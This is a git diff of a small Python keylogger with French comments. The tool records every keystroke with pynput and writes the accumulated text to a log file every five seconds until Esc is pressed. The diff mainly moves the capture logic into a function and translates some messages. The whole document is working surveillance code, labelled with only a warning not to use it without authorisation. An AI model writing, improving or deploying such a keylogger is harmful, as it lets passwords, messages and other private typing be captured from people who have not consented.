@@ -5,6 +5,7 @@ from pynput import keyboard
 import threading 
 import os
 import argparse
+import sys
 
 # prends en argument une touche de clavier et affiche sa valeur 
 log = ""
@@ -24,7 +25,7 @@ def processkeys(key):
         elif key in [keyboard.Key.right, keyboard.Key.left, keyboard.Key.up, keyboard.Key.down] :
             log += ""
         elif key == keyboard.Key.esc :
-            stop_event.set() # Définit l'événement d'arrêt pour interrompre le programme
+           stop_event.set() # Définit l'événement d'arrêt pour interrompre le programme
 
 def report(path):
     global log
@@ -32,19 +33,11 @@ def report(path):
         logfile.write(log)
         logfile.close()
     log = "" # Réinitialise la variable log après l'avoir écrite dans le fichier
-
-    # Si l'événement d'arrêt est défini, arrête le thread de rapport
     if not stop_event.is_set():
         threading.Timer(5.0, report, args=[path]).start()
 
-def main():
-    parser = argparse.ArgumentParser(description="ce script est un Keylogger.Merci de ne pas l'utiliser sur un système d'information sans autorisation!!!")
-    parser.add_argument("-o", dest="path",help="chemin pur enregistrer les logs",required=True)
-    args = parser.parse_args()
-    path = os.path.abspath(args.path)
-    if not os.path.exists(os.path.dirname(path)):
-        parser.error("Merci de spécifier un chemin de fichier valide")
-    
+
+def startCapturing(path): 
     # Keyboard_listener écoute le clavier et appelle la fonction processkeys lorsque l'utilisateur appuie sur une touche de clavier
     # Le rôle de on_press est de définir la fonction à appeler lorsque l'utilisateur appuie sur une touche de clavier                                           
     keyboard_listener = keyboard.Listener(on_press=processkeys)
@@ -64,6 +57,16 @@ def main():
     with keyboard.Listener(on_press=processkeys) as keyboard_listener:
         keyboard_listener.join()
 
+
+
+def main():
+    parser = argparse.ArgumentParser(description="ce script est un Keylogger.Merci de ne pas l'utiliser sur un système d'information sans autorisation!!!")
+    parser.add_argument("-o", dest="path",help="path to output the  logs",required=True)
+    args = parser.parse_args()
+    path = os.path.abspath(args.path)
+    if not os.path.exists(os.path.dirname(path)):
+        parser.error("Please specify a valid path") 
+    startCapturing(path)
 
 if __name__=='__main__':
     main()
